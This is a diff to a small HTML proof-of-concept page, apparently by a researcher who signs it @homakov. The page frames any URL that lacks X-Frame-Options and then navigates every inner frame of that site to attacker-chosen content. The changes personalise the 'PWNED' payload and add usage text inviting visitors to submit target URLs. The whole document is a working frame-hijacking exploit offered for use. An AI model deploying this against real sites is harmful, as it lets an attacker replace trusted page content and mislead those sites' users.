@@ -1,7 +1,7 @@
 <html>
   <head>
     <script>
-    var pwn_url = 'data:text/html,PWNED'
+    var pwn_url = 'data:text/html,PWNED BY @homakov'
     var go = function(){
       for(var i=0,l=frames[0].frames.length;i<l;i++){
         frames[0].frames[i].location.replace(pwn_url);
@@ -13,7 +13,8 @@
     </script>
   </head>
   <body>
-    <input id="target"><a href="javascript:load()">LOAD</a><a href="javascript:go()">PWN FRAMES</a><br>
+  	Just put URL w/o X-Frame-Options and containing some internal frames. I will pwn 'em.
+    <input placeholder="Frameable URL" id="target"><a href="javascript:load()">LOAD</a> | <a href="javascript:go()">PWN FRAMES</a><br>
     <iframe id="mng"></iframe>
   </body>
 </html>
